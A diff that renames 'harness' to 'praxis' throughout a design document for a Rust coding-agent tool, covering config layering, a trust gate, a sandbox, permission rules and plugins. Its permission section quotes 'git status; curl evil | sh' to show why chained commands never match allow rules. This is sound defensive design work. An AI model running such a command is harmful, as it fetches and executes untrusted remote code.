@@ -35,11 +35,11 @@ Inference dominates wall-clock time, so the priorities are:
 
 1. **Avoid prompt reprocessing.** Keep the prefix stable (§7). This is the largest latency lever by far.
 2. **Send fewer tokens.** Budgets, truncation, repo map.
-3. **Harness overhead.** Targets below.
+3. **Praxis overhead.** Targets below.
 
 | Metric | Target | Measured by |
 |---|---|---|
-| `harness --version` cold start | < 20 ms | T7.2 |
+| `praxis --version` cold start | < 20 ms | T7.2 |
 | Ready for input, no MCP servers | < 100 ms | T7.2 |
 | Ready for input with MCP servers | Same: servers connect in the background | T7.2 |
 | Idle RSS, excluding servers | < 30 MB | T7.2 |
@@ -56,7 +56,7 @@ Don't add custom allocators, arenas or `unsafe` optimisations without a benchmar
 ```
 Cargo.toml                 workspace, shared lints, release profile
 crates/
-  harness-core/            library: everything below except front ends
+  praxis-core/            library: everything below except front ends
     src/
       provider/            mod.rs, chat.rs, admin.rs, stream.rs, anthropic.rs (T8.3)
       agent/               loop, events, recovery
@@ -67,9 +67,9 @@ crates/
       session/             JSONL log, checkpoints
       mcp/                 rmcp client wrapper
       plugins/             discovery, skills, commands, agents, hooks
-  harness-cli/             binary `harness`: CLI, REPL, `acp`, `sandbox-exec`
-  harness-vscode/          wasm32 cdylib: extension host side
-  harness-vscode-ui/       wasm32: webview UI
+  praxis-cli/             binary `praxis`: CLI, REPL, `acp`, `sandbox-exec`
+  praxis-vscode/          wasm32 cdylib: extension host side
+  praxis-vscode-ui/       wasm32: webview UI
 editors/vscode/            package.json, webview HTML shell, CSS
 xtask/                     vsix packaging, eval runner
 evals/                     task definitions, fixture repos
@@ -79,9 +79,9 @@ The wasm crates aren't default workspace members, so `cargo test` stays native.
 
 ```mermaid
 flowchart TB
-    cli["harness-cli<br/>native binary"] -->|"links"| core["harness-core<br/>library"]
-    vscode["harness-vscode<br/>wasm32"] -.->|"spawns harness acp"| cli
-    vscode <-.->|"postMessage"| ui["harness-vscode-ui<br/>wasm32"]
+    cli["praxis-cli<br/>native binary"] -->|"links"| core["praxis-core<br/>library"]
+    vscode["praxis-vscode<br/>wasm32"] -.->|"spawns praxis acp"| cli
+    vscode <-.->|"postMessage"| ui["praxis-vscode-ui<br/>wasm32"]
     xtask["xtask<br/>dev only"] -.->|"packages"| vscode
     xtask -.->|"runs evals through"| core
 
@@ -383,7 +383,7 @@ Behaviour:
 - **`Write` and `Edit`** write through a temp file and atomic rename, and preserve file mode. Checkpoint first (§8).
 - **`Grep`** defaults `output_mode` to `content` (matching lines with line numbers), unlike Claude Code's `files_with_matches`: with file names only, small models grep again to find where to read, and get stopped as a loop.
 - **`Read`** returns line-numbered text, refuses binary files, and applies a default line limit. Never filter or minify its content, because `Edit` needs an exact match.
-- **`Bash`** runs through `harness sandbox-exec` (§9), kills the whole process group on timeout, on cancel and when the shell exits (a leftover background job would hold the output pipes open), and has a default timeout of 120 s. Without `unsafe`, the kill goes through the shell's `kill` builtin.
+- **`Bash`** runs through `praxis sandbox-exec` (§9), kills the whole process group on timeout, on cancel and when the shell exits (a leftover background job would hold the output pipes open), and has a default timeout of 120 s. Without `unsafe`, the kill goes through the shell's `kill` builtin.
 - **Tool errors** are returned to the model as content. They never end the turn.
 
 ## 7. Context management
@@ -518,9 +518,9 @@ flowchart LR
     class final result
 ```
 
-Layers: built-in defaults, user `~/.config/harness/config.toml`, project `.harness/config.toml`, environment `HARNESS_*`, CLI flags. Later layers win. Lists of permission rules merge; scalars replace. Errors name the file, key and problem. Unknown keys are errors, so only keys something reads exist: each task adds its own. The project layer is untrusted and passes through the trust gate below.
+Layers: built-in defaults, user `~/.config/praxis/config.toml`, project `.praxis/config.toml`, environment `PRAXIS_*`, CLI flags. Later layers win. Lists of permission rules merge; scalars replace. Errors name the file, key and problem. Unknown keys are errors, so only keys something reads exist: each task adds its own. The project layer is untrusted and passes through the trust gate below.
 
-Variables and flags use dotted keys: `HARNESS_AGENT__MAX_TURN_REQUESTS=20` (double underscore for a dot) and `--config-override agent.max_turn_requests=20`. A value is read as TOML if it parses, else as a string, so `default_model=qwen3.5-4b` works. Keys holding a dot, such as a profile pattern `qwen3.5*`, can only be set in a file. `HARNESS_LOG_CONTENT` is not a config key.
+Variables and flags use dotted keys: `PRAXIS_AGENT__MAX_TURN_REQUESTS=20` (double underscore for a dot) and `--config-override agent.max_turn_requests=20`. A value is read as TOML if it parses, else as a string, so `default_model=qwen3.5-4b` works. Keys holding a dot, such as a profile pattern `qwen3.5*`, can only be set in a file. `PRAXIS_LOG_CONTENT` is not a config key.
 
 ```toml
 default_model = "your-model"
@@ -597,13 +597,13 @@ flowchart TD
 | `lmstudio.*`, `anthropic.*`, `sandbox.*` | **Never honoured from project config**, even when approved |
 | `AGENTS.md`, `CLAUDE.md`, rules, skills, commands, agents (§12) | Loaded as context; they can't grant anything |
 
-Approval stores the SHA-256 of the widening content in `~/.local/share/harness/trust.json` (or under `$XDG_DATA_HOME`), keyed by the project config's path. Any change requires re-approval. In non-interactive mode, unapproved items stay inactive. A refusal isn't stored, so the next interactive run asks again, and a store that can't be parsed is a config error, never an empty store.
+Approval stores the SHA-256 of the widening content in `~/.local/share/praxis/trust.json` (or under `$XDG_DATA_HOME`), keyed by the project config's path. Any change requires re-approval. In non-interactive mode, unapproved items stay inactive. A refusal isn't stored, so the next interactive run asks again, and a store that can't be parsed is a config error, never an empty store.
 
-The widening items so far are `permissions.allow`, `agent.auto_load = true` and a `permissions.mode` wider than the user's. They are approved or refused together: the prompt shows them as TOML, and the hash covers exactly that text. Claude Code's `~/.claude/settings.json` is the user's own file, so its `permissions.allow`, `permissions.deny` and `hooks` apply without a trust prompt: approved by the project owner on 2026-11-12. Project `.claude/settings.json` and `settings.local.json` widen through this gate like `.harness/config.toml`, with `hooks` added to the approved TOML (§12, T9.8). MCP servers and plugins join this list in their own tasks. The hostile fixture in `crates/harness-core/tests/fixtures/hostile-repo` sets every item, and each task that adds one extends it.
+The widening items so far are `permissions.allow`, `agent.auto_load = true` and a `permissions.mode` wider than the user's. They are approved or refused together: the prompt shows them as TOML, and the hash covers exactly that text. Claude Code's `~/.claude/settings.json` is the user's own file, so its `permissions.allow`, `permissions.deny` and `hooks` apply without a trust prompt: approved by the project owner on 2026-11-12. Project `.claude/settings.json` and `settings.local.json` widen through this gate like `.praxis/config.toml`, with `hooks` added to the approved TOML (§12, T9.8). MCP servers and plugins join this list in their own tasks. The hostile fixture in `crates/praxis-core/tests/fixtures/hostile-repo` sets every item, and each task that adds one extends it.
 
 ### Sessions
 
-- `~/.local/share/harness/sessions/<id>.jsonl`: a header line, then one JSON record per line, append-only, mode `0600`. The header is `{"session":{"workspace":"<canonical path>","started":<Unix seconds, UTC>}}`. Tolerate a truncated last line on load, since a crash can cause one.
+- `~/.local/share/praxis/sessions/<id>.jsonl`: a header line, then one JSON record per line, append-only, mode `0600`. The header is `{"session":{"workspace":"<canonical path>","started":<Unix seconds, UTC>}}`. Tolerate a truncated last line on load, since a crash can cause one.
 - Session index: listing a workspace's sessions reads each log's header, its mtime (last activity, since logs only grow) and its first user line (the title, trimmed), newest first. Logs with no readable header, or a truncated one, are skipped and belong to no workspace.
 - Resume (`--resume <id>`) rebuilds history from the log; `--resume` with no ID picks the newest session of the current workspace. The system prefix is rebuilt fresh, not logged. A failed log write stops the turn (`LogFailed`) before another request or tool runs.
 - Before any `Write` or `Edit`, save the original in `<id>/checkpoints/`. `/undo` restores the last turn's files. Copies are kept for the last 20 turns; older turns and their copies are deleted when a new turn begins (`CHECKPOINT_TURNS`). Undo history is not persisted, so a resumed session deletes the copies left by earlier runs when it starts. Session logs are kept until the user removes them. Bash side effects can't be undone, and the UI must say so.
@@ -655,7 +655,7 @@ A hook `allow` skips the prompt but can't override `deny` rules or hard denials.
 
 Compatible with Claude Code's: `Tool`, `Tool(glob)`, `mcp__server__tool`, and `mcp__server` for all of a server's tools. Examples: `Bash(git status*)`, `Edit(src/**)`, `Read(**/.env*)`.
 
-**`Bash` allow rules only match simple commands.** Anything containing `;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, a newline or `${` never matches an allow rule, and always asks. Otherwise `Bash(git *)` would permit `git status; curl evil | sh`. Deny rules match against the whole string and every simple segment. A command whose text mentions a hard-denied path (`.git/hooks`, `.git/config`, `git config`, `hooksPath`, `.harness`, `.mcp.json`, user config) never matches an allow rule either.
+**`Bash` allow rules only match simple commands.** Anything containing `;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, a newline or `${` never matches an allow rule, and always asks. Otherwise `Bash(git *)` would permit `git status; curl evil | sh`. Deny rules match against the whole string and every simple segment. A command whose text mentions a hard-denied path (`.git/hooks`, `.git/config`, `git config`, `hooksPath`, `.praxis`, `.mcp.json`, user config) never matches an allow rule either.
 
 File rules match the path relative to the workspace: `file_path` for `Read`, `Write` and `Edit`, and `path` for the search tools. Deny rules check both the path as written and as resolved, so `..` and symlinks can't step around them. Allow rules check only the resolved path. A deny rule on a file doesn't stop a `Grep` over its folder.
 
@@ -674,11 +674,11 @@ Resolve with `canonicalize` on the deepest existing ancestor, so symlinks and `.
 
 ### Sandbox
 
-All `Bash` commands run as `harness sandbox-exec --policy <json> -- /bin/sh -c <command>`. Using a helper avoids `pre_exec` in a multi-threaded parent, and needs no `unsafe`.
+All `Bash` commands run as `praxis sandbox-exec --policy <json> -- /bin/sh -c <command>`. Using a helper avoids `pre_exec` in a multi-threaded parent, and needs no `unsafe`.
 
 ```mermaid
 sequenceDiagram
-    participant H as harness
+    participant H as praxis
     participant S as sandbox-exec
     participant K as Linux kernel
     participant C as /bin/sh -c command
@@ -702,11 +702,11 @@ sequenceDiagram
 
 `// shortcut: Landlock doesn't restrict UDP or all socket types, so "no network" isn't absolute; add seccomp or a network namespace if this becomes a real threat.`
 
-`// shortcut: Landlock is allowlist-only and can't exclude a subdirectory of a writable tree, so an approved Bash command can still write to .git/hooks or .harness; run git with hooks disabled or mount those paths read-only in a namespace if this proves exploitable.`
+`// shortcut: Landlock is allowlist-only and can't exclude a subdirectory of a writable tree, so an approved Bash command can still write to .git/hooks or .praxis; run git with hooks disabled or mount those paths read-only in a namespace if this proves exploitable.`
 
 Because of that limit, hard denials (§10) are fully enforced for `Write` and `Edit` only. For `Bash`, they are enforced by the prompt: a command that mentions a hard-denied path never matches an allow rule, and the threat model must state the gap, including indirect writes that the text check can't see.
 
-`harness` and `xtask` both handle `sandbox-exec` before the async runtime starts, so restriction happens in a single-threaded process; it exits 126 when it refuses. Evals run the same sandbox nested inside their bwrap container. `sandbox-exec` must be hidden from `--help`. It runs what it's told, and only applies restrictions, so it grants nothing new.
+`praxis` and `xtask` both handle `sandbox-exec` before the async runtime starts, so restriction happens in a single-threaded process; it exits 126 when it refuses. Evals run the same sandbox nested inside their bwrap container. `sandbox-exec` must be hidden from `--help`. It runs what it's told, and only applies restrictions, so it grants nothing new.
 
 MCP servers and hooks are **not** sandboxed in the first version, because they are user-approved programs that often need access. Say so in the approval prompt and threat model.
 
@@ -719,7 +719,7 @@ MCP servers and hooks are **not** sandboxed in the first version, because they a
 2. A repository can't run code or widen permissions without approval, and changed content requires re-approval.
 3. `Bash` never runs outside the sandbox unless the user turned it off in **user** config or a flag.
 4. Write and edit paths are checked after symlink resolution.
-5. **Hard denials,** even under `auto-edit`: `.git` (the file or folder, at any depth, so submodule `.git/modules/*/hooks` and worktree `.git` files count), `.harness/**`, `.mcp.json`, and user config. Otherwise the agent could approve itself or plant code that runs later. `Bash` has a documented limit (§9).
+5. **Hard denials,** even under `auto-edit`: `.git` (the file or folder, at any depth, so submodule `.git/modules/*/hooks` and worktree `.git` files count), `.praxis/**`, `.mcp.json`, and user config. Otherwise the agent could approve itself or plant code that runs later. `Bash` has a documented limit (§9).
 6. Secrets don't appear in logs, session records or child environments. Keys are referenced by variable name.
 7. Tool output, MCP results and file contents are treated as data: never parsed for tool calls, and shown escaped in UIs.
 8. No network traffic except to the configured LM Studio server, the Anthropic API when enabled in user config or a flag, MCP servers, and whatever the user approves.
@@ -733,20 +733,20 @@ MCP servers and hooks are **not** sandboxed in the first version, because they a
 ### CLI
 
 ```
-harness [PROMPT]             one-shot if PROMPT or stdin is given; otherwise REPL
-harness --resume [ID]        resume a session
-harness models               list models and effective context
-harness acp                  ACP agent over stdio
-harness plugin <install|list|enable|disable|remove>
-harness sessions [--json]    list this workspace's sessions; starts no model or MCP server
-harness sandbox-exec         hidden helper
+praxis [PROMPT]             one-shot if PROMPT or stdin is given; otherwise REPL
+praxis --resume [ID]        resume a session
+praxis models               list models and effective context
+praxis acp                  ACP agent over stdio
+praxis plugin <install|list|enable|disable|remove>
+praxis sessions [--json]    list this workspace's sessions; starts no model or MCP server
+praxis sandbox-exec         hidden helper
 ```
 
 Flags: `--model`, `--mode`, `--config-override KEY=VALUE`. So far only `--model` and `--config-override` exist.
 
 REPL commands: `/undo`, `/exit`, and plan-first (T5.9). `/plan <task>` runs the task under read-only mode, so `Write`, `Edit`, `Bash` and MCP tools are refused whatever the rules or the model say, and the prompt shows `(plan)` until `/execute`. `/execute` switches back to the configured mode and asks the model to carry out the plan. Only the developer's commands change the mode; no tool can. Without `--model`, the first loaded model is used. Piped stdin can't answer prompts: only a terminal can approve, so non-interactive runs deny. Exit codes: 0 success, 1 runtime or provider error, 2 usage or config error, 130 cancelled.
 
-After a turn that called any tool, the CLI prints a turn summary to stderr (`harness_core::summary`, T5.7): files changed by successful `Write`/`Edit` calls, Bash commands with exit codes, and whether a test command ran and passed. It reads only the tool log, so it says "No tests ran this turn" even when the model claimed otherwise. Commands that never finished show `not finished`. Test commands are matched by name (`cargo test`, `pytest`, `npm test`, `scripts/verify`, ...).
+After a turn that called any tool, the CLI prints a turn summary to stderr (`praxis_core::summary`, T5.7): files changed by successful `Write`/`Edit` calls, Bash commands with exit codes, and whether a test command ran and passed. It reads only the tool log, so it says "No tests ran this turn" even when the model claimed otherwise. Commands that never finished show `not finished`. Test commands are matched by name (`cargo test`, `pytest`, `npm test`, `scripts/verify`, ...).
 
 Ctrl-C cancels the turn once and exits the second time. When stdout isn't a terminal, output plain text.
 
@@ -759,7 +759,7 @@ Start from `Agent.v1()` with a `Stdio` transport and `Builder` handlers. Handler
 ```mermaid
 sequenceDiagram
     participant C as Client (editor)
-    participant A as harness acp
+    participant A as praxis acp
     participant L as LM Studio
 
     C->>A: initialize
@@ -809,7 +809,7 @@ Checked against `v1::schema` in schema crate 1.15.1 (T0.5, [ADR 0003](adr/0003-k
 
 Handlers run inside the connection's dispatch loop, and awaiting a client response in one deadlocks. The `session/prompt` handler spawns its work and keeps the responder.
 
-So far (T5.1): `session/set_mode` isn't implemented, sessions run in the launch directory whatever `cwd` says, `mcpServers` from the client are ignored, only text prompt blocks reach the model, `notice` always falls back to a message chunk and compaction isn't shown. `session/load` replays user and assistant text only. `session/list` (T5.11) needs a `cwd` and returns only that workspace's sessions, with the first prompt as `title` and the log's mtime as ISO 8601 `updatedAt`; it advertises `sessionCapabilities.list`, uses the stable v1 schema (no unstable feature), and does no pagination (`nextCursor` is always null). The VS Code sessions view (T5.12) lists through `harness sessions --json` run in the workspace, the same way the Plugins view runs `harness plugin list --json`, so a refresh starts no model or MCP server. It opens a session in a new panel through `session/load`. Turns that end in a provider or log failure, or a detected loop, answer with a JSON-RPC error rather than a stop reason.
+So far (T5.1): `session/set_mode` isn't implemented, sessions run in the launch directory whatever `cwd` says, `mcpServers` from the client are ignored, only text prompt blocks reach the model, `notice` always falls back to a message chunk and compaction isn't shown. `session/load` replays user and assistant text only. `session/list` (T5.11) needs a `cwd` and returns only that workspace's sessions, with the first prompt as `title` and the log's mtime as ISO 8601 `updatedAt`; it advertises `sessionCapabilities.list`, uses the stable v1 schema (no unstable feature), and does no pagination (`nextCursor` is always null). The VS Code sessions view (T5.12) lists through `praxis sessions --json` run in the workspace, the same way the Plugins view runs `praxis plugin list --json`, so a refresh starts no model or MCP server. It opens a session in a new panel through `session/load`. Turns that end in a provider or log failure, or a detected loop, answer with a JSON-RPC error rather than a stop reason.
 
 ### Developer experience requirements
 
@@ -836,15 +836,15 @@ See [ADR 0001](adr/0001-rust-only-with-minimal-vscode-glue.md).
 flowchart TB
     subgraph vscode["VS Code"]
         subgraph host["Extension host (Node)"]
-            glue["Generated JS glue"] --> ext["harness-vscode.wasm<br/>activate, deactivate"]
+            glue["Generated JS glue"] --> ext["praxis-vscode.wasm<br/>activate, deactivate"]
         end
         subgraph webview["Webview"]
-            ui["harness-vscode-ui.wasm"]
+            ui["praxis-vscode-ui.wasm"]
         end
         ext <-->|"postMessage"| ui
     end
 
-    ext <-->|"spawned child<br/>newline JSON over stdio"| agent["harness acp<br/>native: all agent work"]
+    ext <-->|"spawned child<br/>newline JSON over stdio"| agent["praxis acp<br/>native: all agent work"]
     agent <--> lms[("LM Studio")]
 
     classDef rust fill:#dbeafe,stroke:#2563eb,color:#1e3a8a
@@ -873,12 +873,12 @@ Features:
 | Tool activity | Collapsible items with status |
 | Model picker | Backed by `models` data and config |
 | Context | Active file and selection attached as prompt resources; diagnostics on request |
-| Output channel | Harness stderr |
+| Output channel | Praxis stderr |
 
 Security and accessibility requirements:
 
 - `capabilities.untrustedWorkspaces.supported = false`.
-- `harness.binaryPath` must have **`"scope": "machine"`**, so a repository's `.vscode/settings.json` can't point it at a malicious binary. The same applies to any setting that affects execution.
+- `praxis.binaryPath` must have **`"scope": "machine"`**, so a repository's `.vscode/settings.json` can't point it at a malicious binary. The same applies to any setting that affects execution.
 - Webview CSP: `default-src 'none'; script-src ${cspSource} 'wasm-unsafe-eval'; style-src ${cspSource}; connect-src ${cspSource}` (`connect-src` is how the glue fetches the wasm, ADR 0001). No inline scripts; `localResourceRoots` limited to the extension directory.
 - Render model text through `pulldown-cmark` with **raw HTML escaped**, not passed through. Only allow `http`, `https` and `vscode` link schemes, opened with the editor's confirmation.
 - Validate every message between webview and extension against typed enums.
@@ -886,7 +886,7 @@ Security and accessibility requirements:
 
 If the child exits, show the error and last stderr lines, with a restart button.
 
-So far (T5.3): the panel is an editor-tab webview opened by `harness.open`, not a webview view. ACP lines are framed by hand with `serde_json` (`harness-vscode/src/protocol.rs`), not the `agent-client-protocol` crate, and become typed panel messages (`text`, `tool`, `permission`, `usage`, `done`, `notice`). Model text renders through `pulldown-cmark` with raw HTML escaped, links outside `http`, `https` and `vscode` dropped, and images reduced to alt text. Tool calls are collapsed `<details>`. Permission prompts are panel buttons; answers are checked against the open request and its offered options, and Stop sends `session/cancel` then answers open prompts `cancelled`. The status line shows phase, elapsed time and context used; "loading model" never shows because ACP sends no such event. On exit the panel shows the code, stderr is in the output channel, and an error notification offers Restart.
+So far (T5.3): the panel is an editor-tab webview opened by `praxis.open`, not a webview view. ACP lines are framed by hand with `serde_json` (`praxis-vscode/src/protocol.rs`), not the `agent-client-protocol` crate, and become typed panel messages (`text`, `tool`, `permission`, `usage`, `done`, `notice`). Model text renders through `pulldown-cmark` with raw HTML escaped, links outside `http`, `https` and `vscode` dropped, and images reduced to alt text. Tool calls are collapsed `<details>`. Permission prompts are panel buttons; answers are checked against the open request and its offered options, and Stop sends `session/cancel` then answers open prompts `cancelled`. The status line shows phase, elapsed time and context used; "loading model" never shows because ACP sends no such event. On exit the panel shows the code, stderr is in the output channel, and an error notification offers Restart.
 
 ### Configuration surfaces
 
@@ -895,10 +895,10 @@ Config reaches the user through three surfaces. Each key lives in one of them:
 | Surface | Keys | Scope |
 |---|---|---|
 | Chat panel | `model`, `agent`, permission `mode` | Session only. Never written to a file; a new session falls back to config. |
-| VS Code settings | `harness.binaryPath` (machine scope), `harness.defaultModel`, `harness.lmstudio.baseUrl`, `harness.agent.maxTurnRequests`, `harness.context.maskKeepTurns`, `harness.context.filterOutput` | Forwarded to the CLI as `--config-override` only when the user set them. |
+| VS Code settings | `praxis.binaryPath` (machine scope), `praxis.defaultModel`, `praxis.lmstudio.baseUrl`, `praxis.agent.maxTurnRequests`, `praxis.context.maskKeepTurns`, `praxis.context.filterOutput` | Forwarded to the CLI as `--config-override` only when the user set them. |
 | File only (`config.toml`) | `mcp`, `hooks`, `sandbox.*`, `permissions.allow`, `permissions.deny`, `anthropic.*`, `profiles.*`, `plugins` | Read from the user and project layers. |
 
-Rule: security-relevant keys are never VS Code settings. Workspace settings (`.vscode/settings.json`) come from the repository, so exposing permissions, sandbox, hooks or the binary path there would let a repository bypass the trust gate (§8) and the invariants in §10. `harness.binaryPath` is machine-scoped for the same reason.
+Rule: security-relevant keys are never VS Code settings. Workspace settings (`.vscode/settings.json`) come from the repository, so exposing permissions, sandbox, hooks or the binary path there would let a repository bypass the trust gate (§8) and the invariants in §10. `praxis.binaryPath` is machine-scoped for the same reason.
 
 Precedence: an extension-supplied `--config-override` is a CLI flag, so it beats env and file layers, as §8 says. An unset VS Code setting adds no override, so the file and env values apply.
 
@@ -925,7 +925,7 @@ Path rules from the manifest reference: component paths must begin with `./` (`s
 
 A built-in `general` agent is always offered through the same `Agent` tool, so delegation works with no plugin installed: it gets every session tool except `Agent` and `Skill` (as every subagent does), has no `model` (so it runs on the session model), and its system prompt asks for a short report of what it found or changed. A plugin agent named `general` is an error at load, naming the plugin.
 
-Plugins are never read from `~/.claude`. Install them explicitly into `~/.local/share/harness/plugins/`. `harness plugin install <path|git URL>` clones into `plugins/<name>/` (a local path may be a plugin subdirectory of a marketplace repo: the repo is cloned and only that subdirectory kept), pins the HEAD commit in `plugins/installed.json`, prints what it can run (hooks, MCP servers, `bin/`) and leaves it disabled; `enable` prints that list again. `remove` keeps `plugins/data/<name>/` unless `--delete-data` is passed or a terminal confirms. Each session (CLI and `harness acp`) loads enabled plugins at start: skills join the index, agents are offered through an `Agent` tool (`subagent_type`, `prompt`) that runs one in a fresh history with only its allowed tools and returns its last reply, `PreToolUse` hooks run in the permission check, and MCP servers connect and are pinned. `/<plugin>:<cmd>` works in the CLI only; other hook events don't run yet.
+Plugins are never read from `~/.claude`. Install them explicitly into `~/.local/share/praxis/plugins/`. `praxis plugin install <path|git URL>` clones into `plugins/<name>/` (a local path may be a plugin subdirectory of a marketplace repo: the repo is cloned and only that subdirectory kept), pins the HEAD commit in `plugins/installed.json`, prints what it can run (hooks, MCP servers, `bin/`) and leaves it disabled; `enable` prints that list again. `remove` keeps `plugins/data/<name>/` unless `--delete-data` is passed or a terminal confirms. Each session (CLI and `praxis acp`) loads enabled plugins at start: skills join the index, agents are offered through an `Agent` tool (`subagent_type`, `prompt`) that runs one in a fresh history with only its allowed tools and returns its last reply, `PreToolUse` hooks run in the permission check, and MCP servers connect and are pinned. `/<plugin>:<cmd>` works in the CLI only; other hook events don't run yet.
 
 ### Skills
 
@@ -937,13 +937,13 @@ Decided in [ADR 0007](adr/0007-markdown-sources-like-claude-code.md). Project ma
 
 **Memory files**, in prefix order (broadest first, nearest last):
 
-1. User: `~/.claude/CLAUDE.md`, then `~/.config/harness/AGENTS.md` (or under `$XDG_CONFIG_HOME`).
+1. User: `~/.claude/CLAUDE.md`, then `~/.config/praxis/AGENTS.md` (or under `$XDG_CONFIG_HOME`).
 2. Each directory from the workspace root down to cwd: `CLAUDE.md` or `.claude/CLAUDE.md`, then `CLAUDE.local.md`. `AGENTS.md` is read only if no `CLAUDE.md` exists in the workspace (Claude Code's default). Never above the workspace root.
-3. Rules without a `paths` field: `~/.claude/rules/**/*.md`, `~/.config/harness/rules/**/*.md`, then `.claude/rules/**/*.md` and `.harness/rules/**/*.md`.
+3. Rules without a `paths` field: `~/.claude/rules/**/*.md`, `~/.config/praxis/rules/**/*.md`, then `.claude/rules/**/*.md` and `.praxis/rules/**/*.md`.
 
 All of them sit in the frozen prefix under the existing budget, trimmed broadest-first with a warning. Block-level HTML comments outside code are stripped.
 
-**Imports:** `@path` on a memory file's line imports that file in place. Relative paths resolve against the importing file; `@~/` against home. Up to four hops; a cycle stops silently at the repeated file. Not parsed inside code spans or fenced blocks. A project file's import must resolve inside the workspace (confinement rules, §9) and a user file's inside `~/.config/harness/`; otherwise it's skipped with a warning.
+**Imports:** `@path` on a memory file's line imports that file in place. Relative paths resolve against the importing file; `@~/` against home. Up to four hops; a cycle stops silently at the repeated file. Not parsed inside code spans or fenced blocks. A project file's import must resolve inside the workspace (confinement rules, §9) and a user file's inside `~/.config/praxis/`; otherwise it's skipped with a warning.
 
 **Nested memory** (*Should*): the first time `Read`, `Write` or `Edit` touches a file under a subdirectory of cwd, that directory's memory file, and any rule whose `paths` glob matches the file, is appended as a message. Each is loaded once per session.
 
@@ -951,11 +951,11 @@ All of them sit in the frozen prefix under the existing budget, trimmed broadest
 
 | Kind | User | Project | Name |
 |---|---|---|---|
-| Skills | `~/.claude/skills/<name>/SKILL.md`, `~/.config/harness/skills/` | `.claude/skills/`, `.harness/skills/` | `name` field, else directory |
-| Commands | `~/.claude/commands/**/*.md`, `~/.config/harness/commands/` | `.claude/commands/`, `.harness/commands/` | File stem; subdirectories join with `:` (`frontend/component.md` is `frontend:component`) |
-| Agents | `~/.claude/agents/**/*.md`, `~/.config/harness/agents/` | `.claude/agents/`, `.harness/agents/` | `name` field |
+| Skills | `~/.claude/skills/<name>/SKILL.md`, `~/.config/praxis/skills/` | `.claude/skills/`, `.praxis/skills/` | `name` field, else directory |
+| Commands | `~/.claude/commands/**/*.md`, `~/.config/praxis/commands/` | `.claude/commands/`, `.praxis/commands/` | File stem; subdirectories join with `:` (`frontend/component.md` is `frontend:component`) |
+| Agents | `~/.claude/agents/**/*.md`, `~/.config/praxis/agents/` | `.claude/agents/`, `.praxis/agents/` | `name` field |
 
-- Skills and commands share one namespace, invoked as `/<name>` in the CLI. A skill beats a command of the same name. On a clash, user beats project for skills and commands, and project beats user for agents (Claude Code's order). `.harness/` beats `.claude/` at the same level, so a harness-only override is possible. Plugin entries stay namespaced and never clash. A standalone agent named `general` is an error, as for plugins.
+- Skills and commands share one namespace, invoked as `/<name>` in the CLI. A skill beats a command of the same name. On a clash, user beats project for skills and commands, and project beats user for agents (Claude Code's order). `.praxis/` beats `.claude/` at the same level, so a praxis-only override is possible. Plugin entries stay namespaced and never clash. A standalone agent named `general` is an error, as for plugins.
 - Frontmatter read: `name`, `description`, `when_to_use` (appended to the description), `argument-hint`, `disable-model-invocation` (left out of the index), `user-invocable: false` (no `/` command), `model`; agents also take `tools`, `disallowedTools`, `maxTurns` as in §12. `allowed-tools`, `permissionMode`, `hooks`, `mcpServers` and `` !`cmd` `` injection warn and are ignored. Other unknown fields are ignored silently, as in Claude Code.
 - Substitutions in skill and command bodies: `$ARGUMENTS`, `$ARGUMENTS[N]` and `$N` (0-based, split like a shell), `${CLAUDE_SKILL_DIR}`, `${CLAUDE_PROJECT_DIR}`, `${CLAUDE_SESSION_ID}`; `\$` escapes. With no placeholder, `ARGUMENTS: <value>` is appended.
 - **Settings:** `~/.claude/settings.json` sits just below the user layer and `.claude/settings.json` plus `.claude/settings.local.json` just below the project layer (§8). Only `permissions.allow`, `permissions.deny` and `hooks` are read, in Claude Code's rule syntax, which §9 already uses; other keys are ignored without a warning, because they're Claude Code's own. Project allow rules and hooks are widening items for the trust gate. A malformed settings file is a config error naming the file, never skipped, because it carries permission rules.
@@ -994,7 +994,7 @@ Revalidate `updatedInput` against the schema, then run the permission check on t
 
 `additionalContext` is appended as a message, keeping the prefix stable.
 
-**Environment for hooks and plugin MCP servers:** `CLAUDE_PLUGIN_ROOT`, `CLAUDE_PLUGIN_DATA` (mapped to `~/.local/share/harness/plugins/data/<id>/`), `CLAUDE_PROJECT_DIR`, `CLAUDE_PLUGIN_OPTION_<KEY>`. `${...}` expands in `command`, `args`, `env` and skill or agent bodies. These names exist for compatibility with existing plugins.
+**Environment for hooks and plugin MCP servers:** `CLAUDE_PLUGIN_ROOT`, `CLAUDE_PLUGIN_DATA` (mapped to `~/.local/share/praxis/plugins/data/<id>/`), `CLAUDE_PROJECT_DIR`, `CLAUDE_PLUGIN_OPTION_<KEY>`. `${...}` expands in `command`, `args`, `env` and skill or agent bodies. These names exist for compatibility with existing plugins.
 
 ### MCP tool names
 
@@ -1020,8 +1020,8 @@ Start with tools, then resources and prompts.
 | Layer | What | How |
 |---|---|---|
 | Unit | Parsers, budgets, rules, recovery, config merge, hook matching | Plain `#[test]`, no I/O |
-| Integration | Agent loop, provider, tools, sessions | `wiremock` fake server with fixtures in `crates/harness-core/tests/fixtures/lmstudio/` and `.../anthropic/` (T8.1); temp directories |
-| Security | §10 invariants | `crates/harness-core/tests/security.rs` plus hostile fixture repo |
+| Integration | Agent loop, provider, tools, sessions | `wiremock` fake server with fixtures in `crates/praxis-core/tests/fixtures/lmstudio/` and `.../anthropic/` (T8.1); temp directories |
+| Security | §10 invariants | `crates/praxis-core/tests/security.rs` plus hostile fixture repo |
 | Protocol | ACP | In-process via the crate's `Channel` transport; mock client |
 | MCP | Client | Small test server built with `rmcp`'s server features as a dev-dependency |
 | Plugin compat | Real format | Fixture plugin with a skill, a hook and an MCP server |
@@ -1034,17 +1034,17 @@ Start with tools, then resources and prompts.
 
 ### Evals
 
-Each `evals/<task>/` has `task.toml` (prompt, limits), `repo/` (fixture) and `check.sh` (exit 0 means success, written so it can't be satisfied by editing the tests: tests live outside the agent's writable path, or are restored before checking). Run with sandbox on and `auto-edit` mode. Until T3.3 provides both, `cargo xtask eval` drives `harness-core` directly, approves every tool call and instead runs each task inside `bwrap`: only the task's copy is writable, the home directory isn't mounted, and the only network path is a forwarded socket to LM Studio. `check.sh` runs in a second `bwrap` with no network, because it executes agent-written code. The command fails if `bwrap` is missing.
